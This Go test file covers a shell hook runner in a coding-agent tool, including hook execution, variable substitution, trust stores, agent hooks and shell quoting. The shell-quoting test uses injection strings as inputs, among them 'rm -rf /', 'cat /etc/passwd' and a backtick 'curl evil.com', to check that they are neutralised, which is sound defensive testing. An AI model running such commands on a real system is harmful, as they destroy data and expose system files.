package plugin

import (
	"log/slog"
	"strings"
	"testing"
	"time"

	"github.com/bobbyjohnstx/tinycode/internal/config"
)

func TestNewShellHookRunner_NilForEmpty(t *testing.T) {
	r := NewShellHookRunner(nil, nil)
	if r != nil {
		t.Fatal("expected nil runner for nil hooks")
	}

	r = NewShellHookRunner(map[string][]config.HookConfig{}, nil)
	if r != nil {
		t.Fatal("expected nil runner for empty hooks")
	}
}

func TestNewShellHookRunner_NonNil(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo hello"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())
	if r == nil {
		t.Fatal("expected non-nil runner")
	}
}

func TestShellHookRunner_RunBefore_Success(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo ok"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("session.start", map[string]string{"SESSION_ID": "ses_1"})
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}
}

func TestShellHookRunner_RunBefore_NilRunner(t *testing.T) {
	var r *ShellHookRunner
	_, err := r.RunBefore("session.start", nil)
	if err != nil {
		t.Fatalf("expected no error for nil runner, got %v", err)
	}
}

func TestShellHookRunner_RunBefore_NoMatchingEvent(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo ok"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("session.end", nil)
	if err != nil {
		t.Fatalf("expected no error for unmatched event, got %v", err)
	}
}

func TestShellHookRunner_RunBefore_AbortOnNonZero(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "exit 1"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err == nil {
		t.Fatal("expected error for non-zero exit")
	}
}

func TestShellHookRunner_RunAfter_NilRunner(t *testing.T) {
	var r *ShellHookRunner
	r.RunAfter("session.end", nil) // should not panic
}

func TestShellHookRunner_RunAfter_FiresAsync(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.end": {{Command: "echo done"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	// Should not block.
	r.RunAfter("session.end", map[string]string{"SESSION_ID": "ses_1"})
	// Give the goroutine time to finish.
	time.Sleep(100 * time.Millisecond)
}

func TestSubstituteVars(t *testing.T) {
	tests := []struct {
		command string
		vars    map[string]string
		want    string
	}{
		{"echo $TOOL", map[string]string{"TOOL": "bash"}, "echo 'bash'"},
		{"echo $SESSION_ID $TOOL", map[string]string{"SESSION_ID": "ses_1", "TOOL": "write"}, "echo 'ses_1' 'write'"},
		{"echo $FILE", map[string]string{"FILE": "/tmp/test.go"}, "echo '/tmp/test.go'"},
		{"echo $MISSING", map[string]string{}, "echo $MISSING"},
		{"no vars", nil, "no vars"},
	}

	for _, tt := range tests {
		got := substituteVars(tt.command, tt.vars)
		if got != tt.want {
			t.Errorf("substituteVars(%q, %v) = %q, want %q", tt.command, tt.vars, got, tt.want)
		}
	}
}

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"simple string", "hello", "'hello'"},
		{"empty string", "", "''"},
		{"command substitution", "$(rm -rf /)", "'$(rm -rf /)'"},
		{"backticks", "`curl evil.com`", "'`curl evil.com`'"},
		{"semicolon and pipe", "foo; rm -rf / | cat /etc/passwd", "'foo; rm -rf / | cat /etc/passwd'"},
		{"newlines", "line1\nline2", "'line1\nline2'"},
		{"single quotes", "it's a test", "'it'\\''s a test'"},
		{"multiple single quotes", "a'b'c", "'a'\\''b'\\''c'"},
		{"double quotes", `key="value"`, `'key="value"'`},
		{"json payload", `{"tool":"bash","args":["rm -rf /"]}`, `'{"tool":"bash","args":["rm -rf /"]}'`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellQuote(tt.input)
			if got != tt.want {
				t.Errorf("shellQuote(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestMatchesFilter(t *testing.T) {
	tests := []struct {
		match map[string]string
		vars  map[string]string
		want  bool
	}{
		{nil, nil, true},
		{map[string]string{}, nil, true},
		{map[string]string{"tool": "write"}, map[string]string{"TOOL": "write"}, true},
		{map[string]string{"tool": "write"}, map[string]string{"TOOL": "bash"}, false},
		{map[string]string{"tool": "write"}, map[string]string{}, false},
		{map[string]string{"TOOL": "write"}, map[string]string{"TOOL": "write"}, true},
	}

	for i, tt := range tests {
		got := matchesFilter(tt.match, tt.vars)
		if got != tt.want {
			t.Errorf("test %d: matchesFilter(%v, %v) = %v, want %v", i, tt.match, tt.vars, got, tt.want)
		}
	}
}

func TestShellHookRunner_MatchFilter(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.after": {
			{Command: "echo matched", Match: map[string]string{"tool": "write"}},
		},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	// Should not fire for non-matching tool.
	_, err := r.RunBefore("tool.execute.after", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should fire for matching tool.
	_, err = r.RunBefore("tool.execute.after", map[string]string{"TOOL": "write"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestShellHookRunner_Timeout(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "sleep 30", Timeout: 1}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	start := time.Now()
	_, err := r.RunBefore("session.start", nil)
	elapsed := time.Since(start)

	if err == nil {
		t.Fatal("expected error for timed-out command")
	}
	if elapsed > 5*time.Second {
		t.Errorf("timeout took too long: %v", elapsed)
	}
}

func TestHookTimeout(t *testing.T) {
	if got := shellHookTimeout(0); got != defaultShellHookTimeout {
		t.Errorf("shellHookTimeout(0) = %v, want %v", got, defaultShellHookTimeout)
	}
	if got := shellHookTimeout(5); got != 5*time.Second {
		t.Errorf("shellHookTimeout(5) = %v, want 5s", got)
	}
}

func TestShellHookRunner_Hooks(t *testing.T) {
	var r *ShellHookRunner
	if r.Hooks() != nil {
		t.Error("expected nil hooks for nil runner")
	}

	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo hi"}},
	}
	r = NewShellHookRunner(hooks, nil)
	if len(r.Hooks()) != 1 {
		t.Errorf("expected 1 event type, got %d", len(r.Hooks()))
	}
}

func TestParseAdditionalContext_ValidJSON(t *testing.T) {
	input := []byte(`{"hookSpecificOutput":{"additionalContext":["hello"]}}`)
	got := parseAdditionalContext(input)
	if len(got) != 1 || got[0] != "hello" {
		t.Errorf("expected [hello], got %v", got)
	}
}

func TestParseAdditionalContext_NoContextField(t *testing.T) {
	input := []byte(`{"hookSpecificOutput":{}}`)
	got := parseAdditionalContext(input)
	if got != nil {
		t.Errorf("expected nil, got %v", got)
	}
}

func TestParseAdditionalContext_PlainText(t *testing.T) {
	input := []byte("some output")
	got := parseAdditionalContext(input)
	if got != nil {
		t.Errorf("expected nil for plain text, got %v", got)
	}
}

func TestParseAdditionalContext_MalformedJSON(t *testing.T) {
	input := []byte(`{"broken`)
	got := parseAdditionalContext(input)
	if got != nil {
		t.Errorf("expected nil for malformed JSON, got %v", got)
	}
}

func TestParseAdditionalContext_CharCap(t *testing.T) {
	// Create a string that exceeds the 10,000 char cap.
	long := make([]byte, 11000)
	for i := range long {
		long[i] = 'x'
	}
	input := []byte(`{"hookSpecificOutput":{"additionalContext":["` + string(long) + `"]}}`)
	got := parseAdditionalContext(input)
	if len(got) != 1 {
		t.Fatalf("expected 1 string, got %d", len(got))
	}
	if len(got[0]) != maxAdditionalContextLen+len("... [truncated]") {
		t.Errorf("expected truncated length %d, got %d", maxAdditionalContextLen+len("... [truncated]"), len(got[0]))
	}
	if got[0][len(got[0])-len("... [truncated]"):] != "... [truncated]" {
		t.Errorf("expected truncated suffix, got %q", got[0][len(got[0])-20:])
	}
}

func TestRunBefore_ReturnsContext(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{Command: `echo '{"hookSpecificOutput":{"additionalContext":["injected context"]}}'`}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	ctx, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(ctx) != 1 || ctx[0] != "injected context" {
		t.Errorf("expected [injected context], got %v", ctx)
	}
}

func TestRunBefore_PlainOutput_NoContext(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "echo 'just plain text'"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	ctx, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ctx != nil {
		t.Errorf("expected nil context for plain text, got %v", ctx)
	}
}

func TestRunAfterSync_CapturesContext(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: `echo '{"hookSpecificOutput":{"additionalContext":["session ctx"]}}'`}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	ctx := r.RunAfterSync("session.start", map[string]string{"SESSION_ID": "ses_1"})
	if len(ctx) != 1 || ctx[0] != "session ctx" {
		t.Errorf("expected [session ctx], got %v", ctx)
	}
}

func TestWithTrust_AttachesStoreAndProjectDir(t *testing.T) {
	store := NewHookTrustStore(t.TempDir())
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo hi"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())
	got := r.WithTrust(store, "/tmp/project")
	if got != r {
		t.Fatal("WithTrust should return the same runner")
	}
	if r.trustStore != store {
		t.Error("expected trustStore to be set")
	}
	if r.projectDir != "/tmp/project" {
		t.Errorf("expected projectDir /tmp/project, got %q", r.projectDir)
	}
}

func TestWithTrust_NilRunnerReturnsNil(t *testing.T) {
	store := NewHookTrustStore(t.TempDir())
	var r *ShellHookRunner
	got := r.WithTrust(store, "/tmp/project")
	if got != nil {
		t.Fatal("WithTrust on nil runner should return nil")
	}
}

func TestWithTrust_UntrustedHookStillRuns(t *testing.T) {
	store := NewHookTrustStore(t.TempDir())
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo hi"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())
	r.WithTrust(store, "/tmp/project")

	// Untrusted hooks run until the approval prompt UI is implemented.
	// Only explicitly disabled hooks are skipped.
	_, err := r.RunBefore("session.start", nil)
	if err != nil {
		t.Fatalf("untrusted hook should still run: %v", err)
	}
}

func TestWithTrust_DisabledHookSkipped(t *testing.T) {
	store := NewHookTrustStore(t.TempDir())
	if err := store.Disable("echo bad", "session.start", "/tmp/project"); err != nil {
		t.Fatalf("Disable failed: %v", err)
	}
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo bad"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())
	r.WithTrust(store, "/tmp/project")

	ctx, err := r.RunBefore("session.start", nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(ctx) != 0 {
		t.Errorf("expected no context from disabled hook, got %v", ctx)
	}
}

func TestWithTrust_TrustedHookRuns(t *testing.T) {
	store := NewHookTrustStore(t.TempDir())
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: "echo ok"}},
	}
	r := NewShellHookRunner(hooks, slog.Default())
	r.WithTrust(store, "/tmp/project")

	// Trust the hook.
	if err := store.Trust("echo ok", "session.start", "/tmp/project"); err != nil {
		t.Fatalf("Trust failed: %v", err)
	}

	_, err := r.RunBefore("session.start", nil)
	if err != nil {
		t.Fatalf("unexpected error for trusted hook: %v", err)
	}
}

func TestRunBefore_ArgsExecution(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Args: []string{"echo", "hello world"}}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("session.start", nil)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}
}

func TestRunBefore_ArgsWithSpaceInPath(t *testing.T) {
	// A path with spaces should arrive as one argument (no shell splitting).
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{Args: []string{"echo", "path with spaces/file.txt"}}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}
}

func TestRunBefore_ArgsNonZeroExit_Aborts(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{Args: []string{"sh", "-c", "exit 1"}}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err == nil {
		t.Fatal("expected error for non-zero exit")
	}
}

func TestRunBefore_ContinueTrue_NonZeroExit(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{
			Command:  "echo 'file is read-only'; exit 1",
			Continue: true,
		}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "write"})
	if err == nil {
		t.Fatal("expected error for blocked hook")
	}
	msg := err.Error()
	if !strings.Contains(msg, "file is read-only") {
		t.Errorf("expected hook stdout in error, got %q", msg)
	}
	if !strings.Contains(msg, "[hook blocked:") {
		t.Errorf("expected [hook blocked:] in error, got %q", msg)
	}
}

func TestRunBefore_ContinueFalse_NonZeroExit_PreservesExistingBehavior(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{
			Command:  "exit 1",
			Continue: false,
		}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err == nil {
		t.Fatal("expected error for non-zero exit")
	}
	msg := err.Error()
	if !strings.Contains(msg, "aborted") {
		t.Errorf("expected 'aborted' in error message, got %q", msg)
	}
}

func TestRunBefore_ContinueTrue_SuccessNoError(t *testing.T) {
	// continue:true with exit 0 should behave normally (no error).
	hooks := map[string][]config.HookConfig{
		"tool.execute.before": {{
			Command:  "echo ok",
			Continue: true,
		}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("expected no error for successful hook, got %v", err)
	}
}

func TestSubstituteVarsArgs(t *testing.T) {
	tests := []struct {
		args []string
		vars map[string]string
		want []string
	}{
		{
			args: []string{"echo", "$TOOL"},
			vars: map[string]string{"TOOL": "bash"},
			want: []string{"echo", "bash"},
		},
		{
			args: []string{"run", "--tool=$TOOL", "--session=$SESSION_ID"},
			vars: map[string]string{"TOOL": "write", "SESSION_ID": "ses_1"},
			want: []string{"run", "--tool=write", "--session=ses_1"},
		},
		{
			args: []string{"echo", "$MISSING"},
			vars: map[string]string{},
			want: []string{"echo", "$MISSING"},
		},
	}

	for _, tt := range tests {
		got := substituteVarsArgs(tt.args, tt.vars)
		if len(got) != len(tt.want) {
			t.Errorf("substituteVarsArgs(%v, %v) = %v, want %v", tt.args, tt.vars, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("substituteVarsArgs(%v, %v)[%d] = %q, want %q", tt.args, tt.vars, i, got[i], tt.want[i])
			}
		}
	}
}

func TestHookIdentifier_Command(t *testing.T) {
	h := config.HookConfig{Command: "echo hello"}
	if got := hookIdentifier(h); got != "echo hello" {
		t.Errorf("hookIdentifier = %q, want %q", got, "echo hello")
	}
}

func TestHookIdentifier_Args(t *testing.T) {
	h := config.HookConfig{Args: []string{"echo", "hello world"}}
	want := "echo\x00hello world"
	if got := hookIdentifier(h); got != want {
		t.Errorf("hookIdentifier = %q, want %q", got, want)
	}
}

func TestHookDisplayName_Command(t *testing.T) {
	h := config.HookConfig{Command: "echo hello"}
	if got := hookDisplayName(h); got != "echo hello" {
		t.Errorf("hookDisplayName = %q, want %q", got, "echo hello")
	}
}

func TestHookDisplayName_Args(t *testing.T) {
	h := config.HookConfig{Args: []string{"echo", "hello world"}}
	if got := hookDisplayName(h); got != "echo hello world" {
		t.Errorf("hookDisplayName = %q, want %q", got, "echo hello world")
	}
}

func TestRunAfterSync_NonZeroExit_NoAbort(t *testing.T) {
	hooks := map[string][]config.HookConfig{
		"session.start": {{Command: `echo '{"hookSpecificOutput":{"additionalContext":["ctx despite error"]}}'; exit 1`}},
	}
	r := NewShellHookRunner(hooks, slog.Default())

	ctx := r.RunAfterSync("session.start", map[string]string{"SESSION_ID": "ses_1"})
	// RunAfterSync doesn't abort on non-zero exit, but CombinedOutput may
	// still capture stdout. The context should be parsed if output exists.
	if len(ctx) != 1 || ctx[0] != "ctx despite error" {
		t.Errorf("expected [ctx despite error], got %v", ctx)
	}
}

func TestAgentHook_RunBefore_BlocksTool(t *testing.T) {
	// Config hooks: none. Agent hooks: block tool.execute.before.
	r := NewShellHookRunner(
		map[string][]config.HookConfig{"session.start": {{Command: "true"}}},
		slog.Default(),
	)
	r.SetAgentHooks(map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "exit 1"}},
	}, "safety-agent")

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err == nil {
		t.Fatal("expected agent hook to block tool")
	}
}

func TestAgentHook_ClearedOnSwitch(t *testing.T) {
	r := NewShellHookRunner(
		map[string][]config.HookConfig{"session.start": {{Command: "true"}}},
		slog.Default(),
	)
	// Set agent hook that blocks.
	r.SetAgentHooks(map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "exit 1"}},
	}, "safety-agent")

	// Clear agent hooks (simulates switch to agent without hooks).
	r.SetAgentHooks(nil, "")

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err != nil {
		t.Fatalf("expected no error after clearing agent hooks, got %v", err)
	}
}

func TestAgentHook_RunsAfterConfigHooks(t *testing.T) {
	// Config hook succeeds, agent hook blocks.
	r := NewShellHookRunner(
		map[string][]config.HookConfig{
			"tool.execute.before": {{Command: "true"}},
		},
		slog.Default(),
	)
	r.SetAgentHooks(map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "exit 1"}},
	}, "guard")

	_, err := r.RunBefore("tool.execute.before", map[string]string{"TOOL": "bash"})
	if err == nil {
		t.Fatal("expected agent hook to block even though config hook passed")
	}
}

func TestSetAgentHooks_NilRunner(t *testing.T) {
	var r *ShellHookRunner
	// Should not panic.
	r.SetAgentHooks(map[string][]config.HookConfig{
		"tool.execute.before": {{Command: "exit 1"}},
	}, "agent")
}
